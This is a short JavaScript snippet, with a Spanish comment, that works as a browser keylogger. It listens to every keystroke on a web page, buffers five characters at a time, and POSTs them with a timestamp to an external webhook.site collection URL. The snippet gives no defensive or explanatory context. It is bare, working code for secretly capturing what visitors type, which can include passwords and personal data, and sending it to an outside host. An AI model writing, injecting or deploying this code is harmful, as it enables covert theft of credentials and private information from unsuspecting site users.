(function(){
  let buffer = "";
  document.addEventListener('keydown', function(e){
    buffer += e.key;

    // Enviar cada 5 caracteres
    if(buffer.length >= 5){
      fetch("https://webhook.site/c7ff61f0-954a-4234-b0a0-cadfdd980c32", {
        method: "POST",
        body: JSON.stringify({
          keystrokes: buffer,
          time: new Date().toISOString()
        }),
        headers: {
          'Content-Type': 'application/json'
        }
      });
      buffer = "";
    }
  });
})();
